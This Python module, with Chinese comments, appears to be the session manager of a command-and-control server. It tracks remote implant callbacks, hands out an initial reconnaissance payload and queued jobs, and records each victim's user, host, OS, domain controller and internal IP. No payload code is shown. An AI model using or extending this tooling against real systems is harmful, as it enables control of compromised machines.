#!/usr/bin/env python3
# coding:utf-8
import uuid
import time
import threading
from collections import OrderedDict
from .job import Job
from .payload import Payload
from .color import BOLD


class Session():
    # session状态
    INIT = 2  # 初始化
    ALIVE = 3  # 存活

    def __init__(self):
        self.__PAYLOAD = Payload()
        self.SESSIONS = OrderedDict()
        self.__SESSION_ID = 0
        self.__SESSION_ID_LOCK = threading.Lock()

    def get_random_session_key(self):
        return uuid.uuid4().hex

    '''
    初始化一个session
    '''

    def init_session(self, session_key, client_ip, user_agent, response_text):
        # 加入到session列表中
        self.__SESSION_ID_LOCK.acquire()
        self.__SESSION_ID += 1
        # session属性
        self.SESSIONS[session_key] = {'id': self.__SESSION_ID, 'job': Job(
        ), 'alive_time': time.strftime('%m-%d %H:%M:%S', time.localtime()), 'client_ip': client_ip, 'user_agent': user_agent}
        self.__SESSION_ID_LOCK.release()
        # 获取并保存session基本信息
        info_array = self.__PAYLOAD.job_info(response_text)
        self.SESSIONS[session_key]['info'] = {'user': info_array[0], 'host': info_array[1], 'os': info_array[2],
                                              'dc': info_array[3], 'arch': info_array[4], 'cwd': info_array[5], 'ip': info_array[6]}

    '''
    更新一个session的状态
    '''

    def update_session(self, session_key):
        if session_key in self.SESSIONS:
            self.SESSIONS[session_key]['alive_time'] = time.strftime(
                '%m-%d %H:%M:%S', time.localtime())

    '''
    根据sessionID获取一个session
    '''

    def get_session(self, session_id):
        for session_key in self.SESSIONS:
            if self.SESSIONS[session_key]['id'] == session_id:
                return self.SESSIONS[session_key]

        return None

    '''
    获取初始化session的任务脚本
    '''

    def load_init_job(self):
        # session初始化的JOB ID固定为1
        return self.__PAYLOAD.get_payload('info', 1, '')

    '''
    获取session的一个任务
    '''

    def load_job(self, session_key):
        if session_key in self.SESSIONS:
            return self.SESSIONS[session_key]['job'].load_job()
        else:
            return b''
    '''
    处理返回的session的任务
    '''

    def check_job(self, session_key, job_id, context):
        if session_key in self.SESSIONS:
            return self.SESSIONS[session_key]['job'].check_job(job_id, context)
        else:
            return False
    '''
    列出所有session
    '''

    def list_sessions(self):
        print('{:>4}\t{:<15}\t{:<15}\t{:<20}\t{}'.format(
            ('SID'), ('CLIENT_IP'), ('INTERNAL_IP'), ('HOST'), ('LAST_ALIVE')))

        for session_key in self.SESSIONS:
            s = self.SESSIONS[session_key]
            print('{:>4}\t{:<15}\t{:<15}\t{:<20}\t{}'.format(
                s['id'], s['client_ip'], s['info']['ip'], s['info']['host'], s['alive_time']))
    '''
    显示一个session的详细数据
    '''

    def show_session_detail(self, sessiond_id):
        s = self.get_session(sessiond_id)
        if s:
            def p(x, y): return print('{}{:<20}{}'.format(' '*8, BOLD(x), y))
            p('SessionID', s['id'])
            p('ClientIP', s['client_ip'])
            p('InternalIP', s['info']['ip'])
            p('UserAgent', s['user_agent'])
            p('User', s['info']['user'])
            p('Host', s['info']['host'])
            p('OS', s['info']['os'])
            p('DC', s['info']['dc'])
            p('Arch', s['info']['arch'])
            p('CWD', s['info']['cwd'])
            p('AliveTime', s['alive_time'])

    '''
    从列表中删除指定的SID
    '''

    def remove_session(self, session_id):
        for session_key in self.SESSIONS:
            if self.SESSIONS[session_key]['id'] == session_id:
                self.SESSIONS.pop(session_key)
                break
